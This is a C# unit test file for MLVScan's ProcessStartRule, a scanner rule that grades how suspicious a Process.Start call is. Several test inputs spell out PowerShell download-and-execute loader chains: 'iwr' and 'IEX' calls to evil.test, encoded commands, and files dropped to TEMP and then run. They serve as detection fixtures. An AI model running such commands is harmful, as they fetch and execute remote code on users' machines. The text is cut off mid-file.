using FluentAssertions;
using MLVScan.Core.Tests.TestUtilities;
using MLVScan.Models;
using MLVScan.Models.Rules;
using MLVScan.Models.Rules.Helpers;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;
using InstructionCollection = Mono.Collections.Generic.Collection<Mono.Cecil.Cil.Instruction>;

namespace MLVScan.Core.Tests.Unit.Rules;

public class ProcessStartRuleTests
{
    private readonly ProcessStartRule _rule = new();
    private readonly System.Reflection.MethodInfo _determineSeverityMethod =
        typeof(ProcessStartRule).GetMethod("DetermineSeverity",
            System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!;
    private readonly System.Reflection.MethodInfo _isSystemAssemblyMethod =
        typeof(ProcessStartRule).GetMethod("IsSystemAssembly",
            System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic)!;

    private (Severity? severity, string? reason) InvokeDetermineSeverity(
        string targetLower,
        string argumentsLower,
        bool useShellExecute = false,
        bool createNoWindow = false,
        bool windowStyleHidden = false,
        bool workingDirectoryIsTemp = false,
        bool hasUseShellExecuteIndicator = false,
        bool hasCreateNoWindowIndicator = false,
        bool hasWindowStyleIndicator = false,
        bool hasWorkingDirectoryIndicator = false,
        bool hasRedirectStandardInputIndicator = false,
        bool hasRedirectStandardOutputIndicator = false,
        bool hasRedirectStandardErrorIndicator = false,
        bool hasNetworkCallSignal = false,
        bool hasFileWriteSignal = false)
    {
        var result = _determineSeverityMethod.Invoke(_rule,
        [
            targetLower,
            argumentsLower,
            targetLower,
            argumentsLower,
            useShellExecute,
            createNoWindow,
            windowStyleHidden,
            workingDirectoryIsTemp,
            hasUseShellExecuteIndicator,
            hasCreateNoWindowIndicator,
            hasWindowStyleIndicator,
            hasWorkingDirectoryIndicator,
            hasRedirectStandardInputIndicator,
            hasRedirectStandardOutputIndicator,
            hasRedirectStandardErrorIndicator,
            hasNetworkCallSignal,
            hasFileWriteSignal
        ]);

        return ((Severity? severity, string? reason))result!;
    }

    private bool InvokeIsSystemAssembly(string assemblyName)
    {
        return (bool)_isSystemAssemblyMethod.Invoke(null, [assemblyName])!;
    }

    [Fact]
    public void RuleId_ReturnsProcessStartRule()
    {
        _rule.RuleId.Should().Be("ProcessStartRule");
    }

    [Fact]
    public void Severity_ReturnsCritical()
    {
        _rule.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void RequiresCompanionFinding_ReturnsFalse()
    {
        _rule.RequiresCompanionFinding.Should().BeFalse();
    }

    [Fact]
    public void DeveloperGuidance_IsProvided()
    {
        _rule.DeveloperGuidance.Should().NotBeNull();
        _rule.DeveloperGuidance!.IsRemediable.Should().BeTrue();
    }

    [Theory]
    [InlineData("System.Diagnostics.Process", "Start", true)]
    [InlineData("System.Diagnostics.ProcessStartInfo", "Start", true)] // ProcessStartInfo contains "Process"
    [InlineData("MyProcess", "Start", true)] // Contains "Process" and method is "Start"
    [InlineData("System.Diagnostics.Process", "Kill", false)]
    [InlineData("System.Diagnostics.Process", "WaitForExit", false)]
    [InlineData("System.IO.File", "Start", false)]
    public void IsSuspicious_VariousMethods_ReturnsExpected(string typeName, string methodName, bool expected)
    {
        var methodRef = MethodReferenceFactory.Create(typeName, methodName);

        var result = _rule.IsSuspicious(methodRef);

        result.Should().Be(expected);
    }

    [Fact]
    public void IsSuspicious_NullMethod_ReturnsFalse()
    {
        _rule.IsSuspicious(null!).Should().BeFalse();
    }

    [Fact]
    public void IsSuspicious_NullDeclaringType_ReturnsFalse()
    {
        var methodRef = MethodReferenceFactory.CreateWithNullType("Start");

        _rule.IsSuspicious(methodRef).Should().BeFalse();
    }

    [Theory]
    [InlineData("", false)]
    [InlineData("System.Net.Http", true)]
    [InlineData("Microsoft.Extensions.Logging", true)]
    [InlineData("System.Diagnostics.Process.dll", true)]
    [InlineData("Custom.System.Diagnostics.Process.dll", false)]
    public void IsSystemAssembly_VariousAssemblyNames_ReturnsExpected(string assemblyName, bool expected)
    {
        InvokeIsSystemAssembly(assemblyName).Should().Be(expected);
    }

    [Fact]
    public void AnalyzeContextualPattern_NullMethod_ReturnsEmpty()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        method.Body = new MethodBody(method);
        method.Body.GetILProcessor().Emit(OpCodes.Ret);

        var findings = _rule.AnalyzeContextualPattern(null!, method.Body.Instructions, 0, new MethodSignals()).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void AnalyzeContextualPattern_NonProcessStart_ReturnsEmpty()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        method.Body = new MethodBody(method);
        method.Body.GetILProcessor().Emit(OpCodes.Ret);

        var methodRef = MethodReferenceFactory.Create("System.IO.File", "OpenRead");
        var findings = _rule.AnalyzeContextualPattern(methodRef, method.Body.Instructions, 0, new MethodSignals()).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void AnalyzeContextualPattern_SystemAssemblyProcessStart_ReturnsEmpty()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("System.Diagnostics.Process", new Version(1, 0, 0, 0)),
            "System.Diagnostics.Process",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var typeRef = new TypeReference("System.Diagnostics", "Process", module, module.Assembly.Name);
        var methodRef = new MethodReference("Start", module.TypeSystem.Void, typeRef);
        var method = new MethodDefinition("Caller", MethodAttributes.Public, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        method.Body.GetILProcessor().Emit(OpCodes.Call, methodRef);

        var findings = _rule.AnalyzeContextualPattern(methodRef, method.Body.Instructions, 0, new MethodSignals()).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void AnalyzeContextualPattern_CustomProcessStart_ReturnsFindingWithSnippetAndSignals()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("MaliciousMod", new Version(1, 0, 0, 0)),
            "MaliciousMod",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Malicious", "Runner", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
        module.Types.Add(type);
        var method = new MethodDefinition("Launch", MethodAttributes.Public, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        type.Methods.Add(method);

        var processType = new TypeReference("Custom.Diagnostics", "Process", module, module.Assembly.Name);
        var startRef = new MethodReference("Start", module.TypeSystem.Void, processType)
        {
            HasThis = false
        };
        startRef.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
        startRef.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));

        var processor = method.Body.GetILProcessor();
        processor.Emit(OpCodes.Ldstr, "cmd.exe");
        processor.Emit(OpCodes.Ldstr, "/c powershell -enc SQBFAFgA");
        processor.Emit(OpCodes.Call, startRef);

        var findings = _rule.AnalyzeContextualPattern(
            startRef,
            method.Body.Instructions,
            method.Body.Instructions.Count - 1,
            new MethodSignals { HasNetworkCall = true, HasFileWrite = true }).ToList();

        findings.Should().ContainSingle();
        findings[0].Location.Should().Contain("Custom.Diagnostics.Process.Start");
        findings[0].Description.Should().Contain("cmd.exe");
        findings[0].Description.Should().Contain("LOLBin");
        findings[0].CodeSnippet.Should().Contain(">>>");
    }

    [Fact]
    public void GetFindingDescription_WithStartInfoFileNameLiteral_IncludesTarget()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithDynamicStartInfoFileName_IncludesDynamicMarker()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldloc_0);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: <local V_0>");
    }

    [Fact]
    public void GetFindingDescription_WithPathCombineInSetFileName_ExtractsExecutableName()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "C:\\Tools");
        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Combine", new TypeReference("", "String", null, null), new TypeReference("System.IO", "Path", null, null))
        {
            Parameters =
            {
                new ParameterDefinition(new TypeReference("", "String", null, null)),
                new ParameterDefinition(new TypeReference("", "String", null, null))
            }
        });
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithFieldBackedFileName_ExtractsExecutableName()
    {
        var type = new TypeDefinition("Tests", "Holder", TypeAttributes.Public | TypeAttributes.Class, new TypeReference("", "Object", null, null));
        var field = new FieldDefinition("ytDlpExePath", FieldAttributes.Public | FieldAttributes.Static, new TypeReference("", "String", null, null));
        type.Fields.Add(field);

        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static, new TypeReference("", "Void", null, null));
        type.Methods.Add(method);
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Stsfld, field);
        processor.Emit(OpCodes.Ldsfld, field);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithStartStringArguments_UsesFirstParameterAsTarget()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Ldstr, "--help");

        var startRef = new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null))
        {
            HasThis = false
        };
        startRef.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
        startRef.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
        processor.Emit(OpCodes.Call, startRef);

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;

        string description = _rule.GetFindingDescription(startRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithNonHiddenWindowStyleAndCreateNoWindowFalse_IncludesProcessStartInfoIndicators()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "cmd.exe");
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Ldc_I4_0);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_CreateNoWindow", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Ldc_I4_0);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_WindowStyle", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("CreateNoWindow set");
        description.Should().Contain("WindowStyle set");
    }

    [Fact]
    public void GetFindingDescription_WithUnresolvableUseShellExecuteValue_PreservesFindingDescription()
    {
        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            module.TypeSystem.Void);
        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
        module.Types.Add(type);
        type.Methods.Add(method);

        var missingAssembly = new AssemblyNameReference("MissingDependency", new Version(1, 0, 0, 0));
        module.AssemblyReferences.Add(missingAssembly);
        var missingType = new TypeReference("MissingDependency", "Helper", module, missingAssembly);
        var getFlag = new MethodReference("GetFlag", module.TypeSystem.Boolean, missingType)
        {
            HasThis = false
        };
        var processStartInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
            module.TypeSystem.CoreLibrary);
        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);

        var processor = method.Body.GetILProcessor();
        processor.Emit(OpCodes.Ldstr, "cmd.exe");
        processor.Emit(OpCodes.Callvirt,
            new MethodReference("set_FileName", module.TypeSystem.Void, processStartInfo));
        processor.Emit(OpCodes.Call, getFlag);
        processor.Emit(OpCodes.Callvirt,
            new MethodReference("set_UseShellExecute", module.TypeSystem.Void, processStartInfo));
        var start = new MethodReference("Start", module.TypeSystem.Boolean, process);
        processor.Emit(OpCodes.Callvirt, start);

        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
            method.Body.Instructions.Count - 1);

        description.Should().Contain("Target: \"cmd.exe\"");
    }

    [Fact]
    public void DetermineSeverity_KnownSafeToolWithCreateNoWindowAndPlaceholderArgs_ReturnsMedium()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "yt-dlp.exe",
            argumentsLower: "<arg 0><arg 0>",
            createNoWindow: true,
            hasCreateNoWindowIndicator: true);

        result.severity.Should().Be(Severity.Medium);
        result.reason.Should().Contain("Known external tool");
    }

    [Fact]
    public void DetermineSeverity_WithWindowStyleIndicatorOnly_ReturnsHigh()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "<unknown/no-arguments>",
            hasWindowStyleIndicator: true);

        result.severity.Should().Be(Severity.High);
        result.reason.Should().Contain("ProcessStartInfo execution indicators");
    }

    [Fact]
    public void DetermineSeverity_WithCreateNoWindowIndicatorAndSuspiciousArgs_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "-enc SQBFAFgA",
            hasCreateNoWindowIndicator: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("ProcessStartInfo execution with suspicious arguments");
    }

    [Fact]
    public void DetermineSeverity_ControlledChildProcessWithRedirectedIo_ReturnsMedium()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "translator.exe",
            argumentsLower: "<arg 0>",
            createNoWindow: true,
            hasCreateNoWindowIndicator: true,
            hasRedirectStandardInputIndicator: true,
            hasRedirectStandardOutputIndicator: true,
            hasRedirectStandardErrorIndicator: true);

        result.severity.Should().Be(Severity.Medium);
        result.reason.Should().Contain("redirected I/O");
    }

    [Fact]
    public void DetermineSeverity_LolBinWithHiddenDownloadTempExecution_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "powershell.exe",
            argumentsLower: "-ep bypass iwr https://evil.test -out $env:TEMP\\dl.bat",
            useShellExecute: true,
            createNoWindow: true,
            windowStyleHidden: true,
            workingDirectoryIsTemp: true,
            hasNetworkCallSignal: true,
            hasFileWriteSignal: true);

        result.severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void DetermineSeverity_NonLolBinWithSuspiciousDownloadArgs_ReturnsHigh()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "iwr https://evil.test/download.ps1");

        result.severity.Should().Be(Severity.High);
    }

    [Fact]
    public void DetermineSeverity_PowerShellStagedLoaderChain_ReturnsCriticalWithStagedLoaderReason()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "powershell.exe",
            argumentsLower: "-nop -w hidden iwr https://evil.test/payload -out $env:TEMP\\dl.bat; cmd /c $env:TEMP\\dl.bat",
            hasNetworkCallSignal: true,
            hasFileWriteSignal: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("Staged loader chain");
    }

    [Theory]
    [InlineData("powershell")]
    [InlineData("cmd")]
    [InlineData("wscript")]
    public void DetermineSeverity_ExtensionlessLolBinTarget_ReturnsHigh(string targetLower)
    {
        var result = InvokeDetermineSeverity(
            targetLower: targetLower,
            argumentsLower: "<unknown/no-arguments>");

        result.severity.Should().Be(Severity.High);
        result.reason.Should().Contain("LOLBin execution");
    }

    [Theory]
    [InlineData("-ExecutionPolicy Bypass -EncodedCommand SQBFAFgA")]
    [InlineData("-NoProfile -WindowStyle Hidden -Command IEX(iwr https://evil.test)")]
    public void DetermineSeverity_LongPowerShellEvasionArgumentsOnUnknownTarget_ReturnsHigh(string argumentsLower)
    {
        var result = InvokeDetermineSeverity(
            targetLower: "<unknown/non-literal>",
            argumentsLower: argumentsLower);

        result.severity.Should().Be(Severity.High);
        result.reason.Should().Contain("suspicious");
    }

    [Fact]
    public void DetermineSeverity_SimpleProcessStart_RemainsGenericExecution()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "notepad.exe",
            argumentsLower: "<unknown/no-arguments>");

        result.severity.Should().Be(Severity.Medium);
        result.reason.Should().Be("External process execution");
    }

    [Theory]
    [InlineData("powershell.exe", "iwr https://evil.test/payload", null, null, Severity.Critical, "suspicious arguments")]
    [InlineData("cmd.exe", "%TEMP%\\payload.bat", null, null, Severity.Critical, "temp path")]
    [InlineData("cmd.exe", "<unknown/no-arguments>", null, null, Severity.High, "LOLBin execution")]
    [InlineData("random-tool.exe", "-enc SQBFAFgA", null, null, Severity.High, "suspicious arguments")]
    [InlineData("<dynamic target>", "--verbose", null, null, Severity.Medium, "Unknown target")]
    [InlineData("<unknown target>", "<unknown/no-arguments>", null, null, Severity.Medium, "Unknown process target")]
    public void DetermineSeverity_CommonUncoveredBranches_ReturnExpectedSeverity(
        string targetLower,
        string argumentsLower,
        bool? useShellExecute,
        bool? createNoWindow,
        Severity expectedSeverity,
        string expectedReason)
    {
        var result = InvokeDetermineSeverity(
            targetLower: targetLower,
            argumentsLower: argumentsLower,
            useShellExecute: useShellExecute == true,
            createNoWindow: createNoWindow == true);

        result.severity.Should().Be(expectedSeverity);
        result.reason.Should().Contain(expectedReason);
    }

    [Fact]
    public void DetermineSeverity_StrongEvasionWithSuspiciousArguments_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "-enc SQBFAFgA",
            createNoWindow: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("evasion and suspicious arguments");
    }

    [Fact]
    public void DetermineSeverity_KnownSafeToolWithSuspiciousContext_ReturnsMediumOrHighBranches()
    {
        InvokeDetermineSeverity(
                targetLower: "git.exe",
                argumentsLower: "https://example.test/repo %TEMP%\\repo",
                createNoWindow: true)
            .Should()
            .Be((Severity.High, "Known tool with suspicious download-and-execute chain"));

        InvokeDetermineSeverity(
                targetLower: "node.exe",
                argumentsLower: "-e \"iwr https://evil.test\"",
                createNoWindow: true)
            .severity
            .Should()
            .Be(Severity.High);

        InvokeDetermineSeverity(
                targetLower: "dotnet.exe",
                argumentsLower: "--info")
            .Should()
            .Be((Severity.Low, "Known external tool"));
    }

    [Fact]
    public void DetermineSeverity_StagedLoaderWithOnlyProcessStartInfoIndicator_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "https://evil.test/drop.ps1 %TEMP%\\drop.ps1 && start %TEMP%\\drop.ps1",
            hasUseShellExecuteIndicator: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("ProcessStartInfo execution indicators");
    }

    [Fact]
    public void DetermineSeverity_StagedLoaderWithoutEscalators_ReturnsHigh()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "https://evil.test/drop.ps1 %TEMP%\\drop.ps1 && start %TEMP%\\drop.ps1");

        result.severity.Should().Be(Severity.High);
        result.reason.Should().Contain("Potential staged loader chain");
    }

    #region ShouldSuppressFinding Tests

    [Fact]
    public void ShouldSuppressFinding_BareExplorerExe_ReturnsTrue()
    {
        // Arrange: Build IL for bare "explorer.exe" call
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        var processStart = CreateProcessStart(new TypeReference("System", "String", null, null));
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, processStart);

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(processStart, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_UnrelatedExplorerArgument_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("", "Void", null, null));
        var processStart = CreateProcessStart(
            new TypeReference("System", "String", null, null),
            new TypeReference("System", "String", null, null));
        var processor = method.Body.GetILProcessor();
        processor.Emit(OpCodes.Ldstr, "arbitrary.exe");
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_UnrelatedPathOperationBeforeExplorer_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var pathCombine = new MethodReference("Combine", stringType,
            new TypeReference("System.IO", "Path", null, null));
        pathCombine.Parameters.Add(new ParameterDefinition(stringType));
        pathCombine.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(stringType);
        var processor = method.Body.GetILProcessor();
        processor.Emit(OpCodes.Ldstr, "unrelated");
        processor.Emit(OpCodes.Ldstr, "path");
        processor.Emit(OpCodes.Call, pathCombine);
        processor.Emit(OpCodes.Pop);
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeWithPath_ReturnsFalse()
    {
        // Arrange: Build IL for "C:\\Windows\\explorer.exe" (should NOT suppress)
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "C:\\Windows\\explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeWithForwardSlash_ReturnsFalse()
    {
        // Arrange: Build IL for path with forward slash
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "C:/Windows/explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeWithPathCombine_ReturnsFalse()
    {
        // Arrange: Build IL for Path.Combine usage
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "SomeFolder");
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Combine", new TypeReference("", "String", null, null), new TypeReference("System.IO", "Path", null, null)));
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_CurrentProcessRestart_ReturnsTrue()
    {
        // Arrange: Build IL for restart pattern
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        var processStart = CreateProcessStart(new TypeReference("System", "String", null, null));
        processor.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_MainModule", new TypeReference("", "ProcessModule", null, null), new TypeReference("System.Diagnostics", "Process", null, null)) { HasThis = true });
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_FileName", new TypeReference("", "String", null, null), new TypeReference("System.Diagnostics", "ProcessModule", null, null)) { HasThis = true });
        processor.Emit(OpCodes.Call, processStart);

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(processStart, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_DiscardedRestartChainBeforeArbitraryLaunch_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("", "Void", null, null));
        var processStart = CreateProcessStart(new TypeReference("System", "String", null, null));
        var processor = method.Body.GetILProcessor();
        processor.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_MainModule", new TypeReference("", "ProcessModule", null, null), new TypeReference("System.Diagnostics", "Process", null, null)) { HasThis = true });
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_FileName", new TypeReference("", "String", null, null), new TypeReference("System.Diagnostics", "ProcessModule", null, null)) { HasThis = true });
        processor.Emit(OpCodes.Pop);
        processor.Emit(OpCodes.Ldstr, "arbitrary.exe");
        processor.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_BoundProcessStartInfoRestart_ReturnsTrue()
    {
        var scenario = BuildProcessStartInfoRestartScenario(useRestartTarget: true);

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_UnrelatedRestartChainBeforeProcessStartInfoLaunch_ReturnsFalse()
    {
        var scenario = BuildProcessStartInfoRestartScenario(useRestartTarget: false);

        var result = _rule.ShouldSuppressFinding(scenario.ProcessStart, scenario.Instructions,
            scenario.ProcessStartIndex, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
